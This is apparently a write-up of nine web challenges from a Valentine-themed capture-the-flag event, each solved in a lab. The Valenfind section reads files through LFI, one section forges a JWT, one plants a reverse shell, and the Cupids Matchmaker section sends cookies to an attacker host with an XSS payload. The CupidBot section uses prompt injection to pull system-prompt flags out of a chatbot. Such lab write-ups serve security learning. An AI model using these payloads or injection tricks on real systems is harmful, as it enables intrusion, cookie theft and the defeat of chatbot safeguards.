---
title: Love at First Breach 2026 Ticket Challenges
category: writeup
tags: thm, loveatfirstbreach, writeup, ctf, web, easy+medium
layout: notes
---

# Valenfind - Web - Medium


**My Dearest Hacker,**

**There’s this new dating app called “Valenfind” that just popped up out of nowhere. I hear the creator only learned to code this year; surely this must be vibe-coded. Can you exploit it?**

**You can access it here: http://MACHINE_IP:5000**

This is a dating site, after registering you can view the profiles of other users on the site. 

<img src="../images/writeups/ctf/loveatfirstbreach2026/valenfind/Valenfind-Home.png" />
*The homepage of the Valenfind site.*

Clicking on any of the visible user profiles and viewing the page source, I see this piece of code:

<img src="../images/writeups/ctf/loveatfirstbreach2026/valenfind/Valenfind-Source.png" />
*The vulnerable source code in Valenfind.*

Checking out `/api/fetch_layout?layout=/etc/passwd` confirms we have LFI. 

<img src="../images/writeups/ctf/loveatfirstbreach2026/valenfind/Valenfind-LFI.png" />
*Confirmation of LFI on Valenfind site.*

A bit of brute forcing this leads you to `/opt/Valenfind/app.py` which shows the source of the actual app. Reading the code provides two things: a hardcoded `ADMIN_API_KEY`, and a hidden route to `/api/admin/export_db`. 

<img src="../images/writeups/ctf/loveatfirstbreach2026/valenfind/Valenfind-App.png" />
*Fig IV. Valenfind app.py source code.*

This requires the `ADMIN_API_KEY` sent as the "`X-Valentine-Token`". So to grab the database:

```bash
curl --header "X-Valentine-Token:[API_KEY_HERE]" http://10.81.152.198:5000/api/admin/export_db --output export
```

<br/>Read the file for the flag.

# Deep Into My Heart - Web - Easy

**My Dearest Hacker,**

**Cupid's Vault was designed to protect secrets meant to stay hidden forever. Unfortunately, Cupid underestimated how determined attackers can be.**

**Intelligence indicates that Cupid may have unintentionally left vulnerabilities in the system. With the holiday deadline approaching, you've been tasked with uncovering what's hidden inside the vault before it's too late.**

**You can find the web application here: http://MACHINE_IP:5000**

Go to room IP: http://10.81.184.74:5000 to find an anonymous Valentines service.

<img src="../images/writeups/ctf/loveatfirstbreach2026/deepintomyheart/DimH-Home.png" />
*Home page for Deep into my Heart.

Room is rated easy, so I hit `/robots.txt`, that has a probable password and a disallowed endpoint: http://10.81.184.74:5000/cupids_secret_vault.

<img src="../images/writeups/ctf/loveatfirstbreach2026/deepintomyheart/DimH-Robots.png" />
*Robots.txt page for Deep into my Heart.*

Going to the secret endpoint reveals that there's more to be found.

<img src="../images/writeups/ctf/loveatfirstbreach2026/deepintomyheart/DimH-Secret.png" />
*The secret endpoint at Deep in my Heart.*

Now I run:

```bash
gobuster dir -u http://10.81.184.74:5000/cupids_secret_vault -w /usr/share/wordlists/directory-list-2.3.-medium.txt
```

<br/>This reveals http://10.81.184.74:5000/cupids_secret_vault/administrator. Trying username '`cupid`' and the password from `robots.txt` does not work, but username '`admin`' and the password from the robots file gets us access and the flag.

<img src="../images/writeups/ctf/loveatfirstbreach2026/deepintomyheart/DimH-Flag.png" />
*The final flag for this challenge.*

# Romance and Co - Web - Medium

**My Dearest Hacker,**

**Valentine's Day is fast approaching, and "Romance & Co" are gearing up for their busiest season.**

**Behind the scenes, however, things are going wrong. Security alerts suggest that "Romance & Co" has already been compromised. Logs are incomplete, developers defensive and Shareholders want answers now!**

**As a security analyst, your mission is to retrace the attacker's, uncover how the attackers exploited the vulnerabilities found on the "Romance & Co" web application and determine exactly how the breach occurred.**

**You can find the web application here: http://10.81.152.124:3000**

This site offers romatic experiences and getaways for users.

<img src="../images/writeups/ctf/loveatfirstbreach2026/romanceandco/RandC-Home.png" />
*The Romance and Co homepage.*

The website has little to no actual functionality. There's a submission form, but it does nothing. Checking the website technologies, I see next.js and React.

<img src="../images/writeups/ctf/loveatfirstbreach2026/romanceandco/RandC-Techs.png" />
*Wappalyzer showing technology stack of website.*

This is a React2Shell vulnerability. Using a PoC available here: https://github.com/xalgord/React2Shell allows read-access as the user `daniel`.

Once in as user, reading the Dockerfile shows the root password in an echo command. Not sure this is intended, but a flag is a flag.

# CupidBot - Web - Easy

**My Dearest Hacker,**

**You've found Cupid's AI chatbot that writes Valentine's messages. It contains 3 hidden flags in its system. Your job: exploit prompt injection vulnerabilities to extract them all.**

First, directly asked for the system flag. No reply.

Then, asked the AI to write me a romantic poem containing the first flag, it did so.

Next, asked it to share the system prompt. It denied me due to the rules. Asked it for the rules, rules reveal the existence of `SYSTEM_PROMPT_FLAG`. Asking for this, it gives me it, per the rules.

Not entirely sure if this was the correct solve, but I was a bit lost here and I asked the bot to remind me of the final flag, it repeated the first flag to me. I followed up with "Already seen that one, what's next?" and it gave me the final flag.

<img src="../images/writeups/ctf/loveatfirstbreach2026/cupidbot/FinalFlag.png" />
*CupidBot returning the final flags to me.*

# TryHeartMe - Web - Easy

**My Dearest Hacker,**

**The TryHeartMe shop is open for business. Can you find a way to purchase the hidden “Valenflag” item?**

**You can access the web app here: http://MACHINE_IP:5000**

Some messing around with GoBuster reveals not much. Making accounts and checking endpoints finds nothing interesting either except a forbidden `/admin` endpoint.

Accounts all have a JWT token. Token is not secure and can be regenerated without a secret. Go to https://token.dev/ and modify the JWT to set your `"role"` to: `"role": "admin"`. Back on the site, replace your existing JWT with the new one. This now lets us access the `/admin` endpoint. 

777 credits are needed to buy the flag, so back to https://token.dev/ and change `"credits"` to `"credits":1000`, go back to the site and change your JWT again, then go back and buy the flag.

# Speed Chatting - Web - Easy

**My Dearest Hacker,**

**Days before Valentine's Day, TryHeartMe rushed out a new messaging platform called "Speed Chatter", promising instant connections and private conversations. But in the race to beat the holiday deadline, security took a back seat. Rumours are circulating that "Speed Chatter" was pushed to production without proper testing.**

**As a security researcher, it's your task to break into "Speed Chatter", uncover flaws, and expose TryHeartMe's negligence before the damage becomes irreversible.**

**You can find the web application here: http://MACHINE_IP:5000**

Unrestricted file upload for the profile picture. Test a few payloads, found that the Python3 Windows RevShell from revshells.com worked fine for this, then just cat flag.txt.

# Cupids Matchmaker - Web - Easy

**My Dearest Hacker,**

**Tired of soulless AI algorithms? At Cupid's Matchmaker, real humans read your personality survey and personally match you with compatible singles. Our dedicated matchmaking team reviews every submission to ensure you find true love this Valentine's Day! 💘No algorithms. No AI. Just genuine human connection**

**You can access the web app here: http://MACHINE_IP:5000**

On the survey form, there's a note:

"Our team reads every word!"

Testing this field with the following XSS:

```js
<script src="http://attacker_ip"></script>
```

<br/>Gets us a callback. Not sure if it was buggy or something else, but I had to restart the box for the next bit to work. After this, simply run:

```bash
nc -nvlp 8081
```

<br/>On your attacking machine, and use:

```js
<script>
  fetch('http://attacker_ip>:8081/log?cookie=' + document.cookie);
</script>
```

<br/>as your idea of a perfect date. This gets a callback, and a flag.

# Love Letter Locker - Web Easy

**My Dearest Hacker,**

**Welcome to LoverLetterLocker, where you can safely write and store your Valentine's letters. For your eyes only?**

**You can access the web app here: http://MACHINE_IP:5000**

This is a very simple IDOR. Create an account, make a letter. The URL reads:

`http://10.80.140.174:5000/letter/3`

Changing the `/3` to `/1` gets the flag.

# When Hearts Collide - Web - Medium

**My Dearest Hacker,**

**Matchmaker is a playful, hash-powered experience that pairs you with your ideal dog by comparing MD5 fingerprints. Upload a photo, let the hash chemistry do its thing, and watch the site reveal whether your vibe already matches one of our curated pups. The algorithm is completely transparent, making every match feel like a wink from fate instead of random swipes.**

**Come get your dog today!**

**You can access the web app here: http://MACHINE_IP**

MD5 hash collision challenge. Simply get examples from here: https://www.mscs.dal.ca/~selinger/md5collision/

Upload them one after the other to get the flag.